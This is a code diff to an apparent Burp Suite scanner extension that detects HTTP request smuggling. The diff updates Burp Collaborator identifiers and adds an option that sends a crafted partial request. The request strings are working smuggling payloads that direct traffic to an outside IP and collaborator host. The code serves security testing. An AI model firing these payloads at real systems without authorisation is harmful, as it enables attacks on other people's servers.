@@ -106,13 +106,16 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
         //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
         //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
         if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
-            cpoc2 = sendPoc(base, service, "headerConcat", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
+            cpoc2 = sendPoc(base, service, "headerConcat", "GET /?x=exfvn9ifwkqy1bknteg8zcwhm8s2gr/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
         }
         if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
-            cpoc3 = sendPoc(base, service, "bodyConcat", "POST /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=");
+            cpoc3 = sendPoc(base, service, "bodyConcat", "POST /?x=exfvn9ifwkqy1bknteg8zcwhm8s2gr/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=");
         }
         if (Utilities.globalSettings.getBoolean("poc: collab")) {
-            sendPoc(base, service, "collab", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".pvocvroibeunt5kkbqvlhuj3wu2rqg.burpcollaborator.net\r\n\r\n");
+            sendPoc(base, service, "collab", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".exfvn9ifwkqy1bknteg8zcwhm8s2gr.burpcollaborator.net\r\n\r\n");
+        }
+        if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
+            sendPoc(base, service, "collab-header", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".exfvn9ifwkqy1bknteg8zcwhm8s2gr.burpcollaborator.net\r\nX-Foo: X");
         }
 
         return gpoc || cpoc2 || cpoc3;
